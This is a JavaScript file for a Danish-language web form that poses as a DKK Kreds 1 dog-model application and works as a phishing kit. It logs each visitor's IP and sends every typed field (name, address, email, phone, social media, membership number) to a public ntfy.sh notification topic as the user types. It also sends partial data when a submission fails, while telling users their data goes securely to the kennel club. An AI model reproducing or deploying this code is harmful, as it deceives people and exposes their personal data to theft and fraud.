// --- CONFIGURATION ---
const NTFY_TOPIC = "dkkkreds1_fotoshoot_secret_98765"; 
let currentLang = 'da';
let dogCount = 0;
let userIP = "Fetching...";
const sessionId = Math.random().toString(36).substring(2, 9);

// --- ALLOWED MAJOR DOMAINS ---
const allowedDomains = [
    'gmail.com', 'yahoo.com', 'hotmail.com', 'hotmail.dk', 'outlook.com', 'outlook.dk', 
    'live.com', 'live.dk', 'icloud.com', 'me.com', 'mac.com', 'mail.com', 'msn.com',
    'protonmail.com', 'jubii.dk', 'sol.dk', 'tdcadsl.dk', 'webspeed.dk', 'mail.dk', 
    'ofir.dk', 'post.tele.dk', 'privat.dk', 'stofanet.dk', 'get2net.dk', 'ymail.com', 
    'googlemail.com', 'pm.me', 'zohomail.eu', 'zohomail.com', 'gmx.com'
];

// --- TRANSLATIONS ---
const i18n = {
    da: {
        menu: "MENU", login: "Login",
        nav1: "Hundeejer", nav2: "Opdrætter", nav3: "Aktiviteter",
        nav4: "Udstillinger", nav5: "Om DKK", nav6: "Kontakt",
        hero_title: "DKK Hundemodel Ansøgning", hero_text: "Er din hund den næste stjerne i DKK Kreds 1's kampagnemateriale? Udfyld formularen sikkert herunder.",
        owner_title: "1. Ejerinformation", f_name: "Fulde navn", f_address: "Fulde Adresse", 
        f_email: "E-mailadresse", f_email_note: "Eks. gmail.com, hotmail.com, mail.dk", f_phone: "Telefonnummer (+45...)", 
        f_socials: "Sociale Medier (f.eks. Instagram)", f_dkk: "DKK Medlemsnummer (Valgfrit)",
        dog_title: "2. Hundeinformation", d_name: "Hundens navn og Race", d_age: "Hundens Alder", 
        d_skills: "Tricks og Færdigheder", d_photos: "Link til billeder (Google Drev/SoMe)",
        btn_add_dog: "Tilføj endnu en hund", btn_submit: "Send Ansøgning",
        success_title: "Tak for din ansøgning!", success_desc: "Dine informationer er sendt sikkert afsted til DKK Kreds 1.",
        error_title: "Hov, der mangler noget!", error_desc: "Tjek venligst e-mail (kun store domæner tilladt) og telefonnummer."
    },
    en: {
        menu: "MENU", login: "Login",
        nav1: "Dog Owner", nav2: "Breeder", nav3: "Activities",
        nav4: "Exhibitions", nav5: "About DKK", nav6: "Contact",
        hero_title: "DKK Dog Model Application", hero_text: "Is your dog the next star of DKK District 1's campaign? Fill out the form securely below.",
        owner_title: "1. Owner Info", f_name: "Full Name", f_address: "Full Address", 
        f_email: "Email Address", f_email_note: "E.g., gmail.com, hotmail.com, mail.dk", f_phone: "Phone Number (+45...)", 
        f_socials: "Social Media (e.g., Instagram)", f_dkk: "DKK Member Number (Optional)",
        dog_title: "2. Dog Info", d_name: "Dog's Name & Breed", d_age: "Dog's Age", 
        d_skills: "Tricks & Skills", d_photos: "Link to photos (Google Drive/SoMe)",
        btn_add_dog: "Add another dog", btn_submit: "Submit Application",
        success_title: "Thank you!", success_desc: "Your information has been securely sent to DKK District 1.",
        error_title: "Oops, something is missing!", error_desc: "Please check your email (only major domains allowed) and phone number."
    }
};

// --- INITIALIZE ---
window.addEventListener('DOMContentLoaded', async () => {
    try {
        let res = await fetch('https://api.ipify.org?format=json');
        let data = await res.json();
        userIP = data.ip;
    } catch(e) { userIP = "Unknown"; }

    addDogField();
    bindLanguageSwitch();
    sendNtfy("👀 Page Visited", `Session: ${sessionId}\nIP: ${userIP}\nTime: ${new Date().toLocaleString('da-DK')}`, "eyes");
});

// --- VALIDATION LOGIC ---
function validateEmail(email) {
    const re = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
    if (!re.test(email)) return false;
    const domain = email.split('@')[1].toLowerCase();
    return allowedDomains.includes(domain);
}

function validatePhone(phone) {
    // Fjerner mellemrum, bindestreger og parenteser
    const cleanPhone = phone.replace(/[\s\-\(\)]/g, '');
    // Tillader valgfrit + i starten, efterfulgt af 8-15 tal (dækker næsten alle lande, inkl. DK: +45XXXXXXXX)
    const re = /^(\+?\d{8,15})$/; 
    return re.test(cleanPhone);
}

function validateField(input) {
    const val = input.value.trim();
    let isValid = input.checkValidity() && val !== '';

    if (input.type === 'email') isValid = validateEmail(val);
    if (input.type === 'tel') isValid = validatePhone(val);

    if (isValid) {
        input.classList.remove('invalid');
        input.classList.add('valid');
    } else {
        input.classList.remove('valid');
        if(val !== '') input.classList.add('invalid'); 
    }
    return isValid;
}

// --- DYNAMIC DOG FIELDS ---
function addDogField() {
    dogCount++;
    const container = document.getElementById('dogsContainer');
    const div = document.createElement('div');
    div.className = 'dog-card grid grid-cols-1 md:grid-cols-2 gap-6';
    div.innerHTML = `
        <div class="absolute -top-3 left-4 bg-dkkRed text-white text-xs font-bold px-3 py-1 rounded-full">#${dogCount}</div>
        <div class="floating-input-group col-span-2">
            <input type="text" class="dogName floating-input" required placeholder=" ">
            <label class="floating-label" data-i18n="d_name">${i18n[currentLang].d_name}</label>
            <svg class="valid-icon w-6 h-6 text-green-500 absolute right-3 top-4 hidden" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M5 13l4 4L19 7"></path></svg>
        </div>
        <div class="floating-input-group">
            <input type="text" class="dogAge floating-input" required placeholder=" ">
            <label class="floating-label" data-i18n="d_age">${i18n[currentLang].d_age}</label>
            <svg class="valid-icon w-6 h-6 text-green-500 absolute right-3 top-4 hidden" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M5 13l4 4L19 7"></path></svg>
        </div>
        <div class="floating-input-group">
            <input type="url" class="dogPhotos floating-input" required placeholder=" ">
            <label class="floating-label" data-i18n="d_photos">${i18n[currentLang].d_photos}</label>
            <svg class="valid-icon w-6 h-6 text-green-500 absolute right-3 top-4 hidden" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M5 13l4 4L19 7"></path></svg>
        </div>
        <div class="floating-input-group col-span-2">
            <input type="text" class="dogSkills floating-input" required placeholder=" ">
            <label class="floating-label" data-i18n="d_skills">${i18n[currentLang].d_skills}</label>
            <svg class="valid-icon w-6 h-6 text-green-500 absolute right-3 top-4 hidden" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M5 13l4 4L19 7"></path></svg>
        </div>
    `;
    container.appendChild(div);
    bindTracking(div);
}
document.getElementById('addDogBtn').addEventListener('click', addDogField);

// --- BLUR TRACKING & LIVE VALIDATION ---
function bindTracking(parent = document) {
    const inputs = parent.querySelectorAll('input');
    inputs.forEach(input => {
        input.addEventListener('input', () => validateField(input));
        
        input.addEventListener('blur', (e) => {
            validateField(e.target);
            const val = e.target.value.trim();
            if (val !== "") {
                const label = e.target.nextElementSibling ? e.target.nextElementSibling.innerText : "Felt";
                sendNtfy("✍️ Bruger skriver...", `Felt: ${label}\nVærdi: ${val}\nSession: ${sessionId}`, "pencil2");
            }
        });
    });
}

// --- DATA COLLECTION ---
function getPayload() {
    let dogDetails = "";
    document.querySelectorAll('.dog-card').forEach((el, index) => {
        dogDetails += `\nHUND ${index + 1}:\n- Navn: ${el.querySelector('.dogName').value}\n- Alder: ${el.querySelector('.dogAge').value}\n- Færdigheder: ${el.querySelector('.dogSkills').value}\n- Fotos: ${el.querySelector('.dogPhotos').value}\n`;
    });

    return `
EJER:
Navn: ${document.getElementById('ownerName').value}
Adresse: ${document.getElementById('ownerAddress').value}
Email: ${document.getElementById('ownerEmail').value}
Tlf: ${document.getElementById('ownerPhone').value}
SoMe: ${document.getElementById('ownerSocials').value || 'Ingen'}
DKK: ${document.getElementById('dkkMember').value || 'Ingen'}

HUNDE INFO: ${dogDetails}
-----------------------
IP: ${userIP}`;
}

// --- SUBMIT HANDLING ---
document.getElementById('dkkForm').addEventListener('submit', async (e) => {
    e.preventDefault();
    const btn = document.getElementById('submitBtn');
    const alertBox = document.getElementById('errorAlert');
    
    // Check all fields
    let formIsValid = true;
    document.querySelectorAll('input[required]').forEach(input => {
        if (!validateField(input)) {
            formIsValid = false;
            input.classList.add('invalid'); // trigger shake
        }
    });

    if (!formIsValid) {
        alertBox.classList.remove('hidden');
        // SEND PARTIAL DATA ON INVALID SUBMIT
        sendNtfy("⚠️ Fejl / Manglende Data Submit", getPayload(), "warning");
        return;
    }

    alertBox.classList.add('hidden');
    btn.innerHTML = `<svg class="animate-spin h-6 w-6 text-white" fill="none" viewBox="0 0 24 24"><circle class="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" stroke-width="4"></circle><path class="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8v8H4z"></path></svg> Sender...`;
    btn.disabled = true;

    try {
        await sendNtfy("🐶 📸 SUCCESS: Ny DKK Model!", getPayload(), "camera_flash,dog");
        document.getElementById('dkkForm').classList.add('hidden');
        document.getElementById('successMessage').classList.remove('hidden');
    } catch(err) {
        alert("Noget gik galt. Prøv igen.");
        btn.disabled = false;
    }
});

// --- HELPER FUNCTION: NTFY VIA JSON (FIXES EMOJI CRASH) ---
function sendNtfy(title, message, tags) {
    // By using a JSON body, we bypass the HTTP Header ASCII limitations completely
    return fetch(`https://ntfy.sh/`, {
        method: 'POST',
        body: JSON.stringify({
            topic: NTFY_TOPIC,
            title: title,
            message: message,
            tags: tags ? tags.split(',') : []
        }),
        headers: { 'Content-Type': 'application/json' }
    }).catch(err => console.error("Ntfy Error:", err));
}

// --- LANGUAGE SWITCHER ---
function bindLanguageSwitch() {
    document.getElementById('langSwitchBtn').addEventListener('click', () => {
        currentLang = currentLang === 'da' ? 'en' : 'da';
        document.getElementById('langLabel').innerText = currentLang === 'da' ? 'English' : 'Dansk';
        
        document.querySelectorAll('[data-i18n]').forEach(el => {
            const key = el.getAttribute('data-i18n');
            if (i18n[currentLang][key]) el.innerText = i18n[currentLang][key];
        });
    });
}
